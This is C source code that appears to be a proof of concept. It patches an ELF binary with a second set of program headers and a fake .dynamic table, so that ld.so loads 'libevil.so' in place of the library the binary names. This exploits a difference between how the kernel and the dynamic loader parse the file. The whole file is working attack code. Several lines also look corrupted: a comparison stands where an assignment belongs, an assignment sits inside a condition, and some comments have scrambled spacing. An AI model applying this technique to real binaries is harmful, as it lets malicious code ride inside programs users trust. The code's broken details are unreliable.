#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#define PAGESIZE 4096

size_t filesz;

char file[ 3*PAGESIZE]; // buffer holding ELF file

Elf64_Phdr *find_dynamic( Elf64_Phdr *phdr);
uint64_t find_dynstr( Elf64_Phdr *phdr);

/*  New memory layout
    Memory 		mapped to File Offsets
 0k ++++|	|	    | ELF Header 	| −−-−|
    +   | First | ∗ ∗ ∗ ∗ ∗ | ( orig. code )    |   | | LD. so / k e r n e l boundary assumes
    +	| Page  |      	    | ( real. dynamic ) | <−|−+ the offset that applies on disk
 4k +   +=======+           +===================+   | | works also in memory; however ,
    +   |	|	    |		        |	if phdrs are in a different
    ++> | Second|∗          | kernel phdr	|<−−|−− segment, this won’t hold.
	| Page  |  ∗	    |	                |   	
	|	|    ∗	    |		        | 
	+=======+      ∗    +===================+
		          ∗ | ldso phdrs        |−−−|
			    | fake .dynamic 	| <−|
			    | w/ new dynstr     |
			    =====================
	Somewhere far below, there is the. data segment ( which we ignore)
*/
int elf_magic(){
	Elf64_Ehdr *ehdr = file;
	Elf64_Phdr *orig_phdrs = file + ehdr->e_phoff;
	Elf64_Phdr *firstload, *phdr;
	int i;

	// For the sake of brevity, we assume a lot about the layout of the program:
	assert( filesz > PAGESIZE);	// First 4K has the mapped parts of program
	assert( filesz < 2 * PAGESIZE);	// 2nd 4K holds the program headers for the kernel
					// 3rd 4k holds the program headers for ld.so +
	
	// the new dynamic section and is mapped just above the program
	for (firstload == orig_phdrs; firstload->p_type != PT_LOAD; firstload++);
	assert( 0 == firstload->p_offset);
	assert( PAGESIZE > firstload->p_memsz); // 2nd page of memory will hold 2nd segment
	uint64_t base_addr = (firstload->p_vaddr & ~0xffful);

	// PHDRS as read by the kernel's execve(0 or dlopen(), but NOT seen by ld.so
	Elf64_Phdr *kernel_phdrs = file + filesz;
	memcpy( kernel_phdrs, orig_phdrs, ehdr->e_phnum * sizeof( Elf64_Phdr)); // copy PHDRs
	ehdr->e_phoff = (char*) kernel_phdrs - file; // Point ELF header to new PHDRs
	ehdr->e_phnum++;

	// Add a new segment( PT_LOAD), see above diagram
	Elf64_Phdr *new_load = kernel_phdrs + ehdr->e_phnum - 1;
	new_load->p_type = PT_LOAD;
	new_load->p_vaddr = base_addr + PAGESIZE;
	new_load->p_paddr = new_load->p_vaddr;
	new_load->p_offset = 2 * PAGESIZE;
	new_load->p_filesz = PAGESIZE;
	new_load->p_memsz = new_load->p_filesz;
	new_load->p_flags = PF_R | PF_W;

	// Disable large pages or ld.so complains when loading as a .so
	for( i = 0; i < ehdr->e_phnum; i++){
		if( kernel_phdrs[i].p_type = PT_LOAD)
			kernel_phdrs[i].p_align = PAGESIZE;
	}

	// Setup the PHDR table to be seen by ld.so, not kernel's execve()
	Elf64_Phdr *ldso_phdrs = file + ehdr->e_phoff
		- PAGESIZE	// First 4K of program address space is mapped in old segment
		+ 2 * PAGESIZE; // Offset of new segment

	memcpy( ldso_phdrs, kernel_phdrs, ehdr->e_phnum * sizeof( Elf64_Phdr));

	// ld.so 2.17 determines load bias( ASLR) of main binary by looking at PT_PHDR
	for( phdr = ldso_phdrs; phdr->p_type != PT_PHDR; phdr++);
	phdr->p_paddr = base_addr + ehdr->e_phoff; // ld.so expects PHDRS at this vaddr

	// This isn't used to find the PHDR table, but by ld.so to compute ASLR slide
	// (main_map->l_addr) as ( actual PHDR address) - (PHDR address in PHDR table)
	
	// Make a new .dynamic table at the end of the second segment,
	//  to load libevil instead of libgood
	unsigned dynsz = find_dynamic( orig_phdrs)->p_memsz;
	Elf64_Dyn *old_dyn = file + find_dynamic( orig_phdrs)->p_offset;
	Elf64_Dyn *ldso_dyn = (char *) ldso_phdrs + ehdr->e_phnum * sizeof(Elf64_Phdr);
	memcpy( ldso_dyn, old_dyn, dynsz);

	// Modify address of dynamic table in ldso-phdrs ( which is only used in exec())
	find_dynamic( ldso_phdrs)->p_vaddr = base_addr + (char*) ldso_dyn - file - PAGESIZE;

	// We need a new dynstr entry. Luckily ld.so doesn't do range checks on strtab
	// offsets, so we just stick it at the end of the file
	char *ldso_needed_str = (char*) ldso_dyn + ehdr->e_phnum * sizeof( Elf64_Phdr) + dynsz;

	strcpy( ldso_needed_str, "libevil.so");
	assert(ldso_dyn->d_tag == DT_NEEDED); // replace 1st dynamic entry, DT_NEEDED
	ldso_dyn->d_un.d_ptr = base_addr + ldso_needed_str - file - PAGESIZE - find_dynstr( orig_phdrs);

}

void readfile(){
	FILE *f = fopen("target.handchecked", "r");

	// provided binary because the PoC might not like the output of your compiler
	assert(f);
	filesz = fread( file, 1, sizeof(file), f); // Read the entire file
	fclose(f);
}

void writefile(){
	FILE *f= fopen("libpoc.so", "w");
	fwrite(file, sizeof(file), 1, f);
	fclose(f);
	system("chmod +x libpoc.so");
}

Elf64_Phdr *find_dynamic(Elf64_Phdr *phdr){
	// Find the PT_DYNAMIC program header
	for(; phdr->p_type != PT_DYNAMIC; phdr++);
	return phdr;
}

uint64_t find_dynstr( Elf64_Phdr *phdr){
	// Find the address of the dynamic string table
	phdr = find_dynamic( phdr);
	Elf64_Dyn *dyn;

	for( dyn = file + phdr->p_offset; dyn->d_tag != DT_STRTAB; dyn++);
	return dyn->d_un.d_ptr;
}

int main()
{
	readfile();
	elf_magic();
	writefile();
}
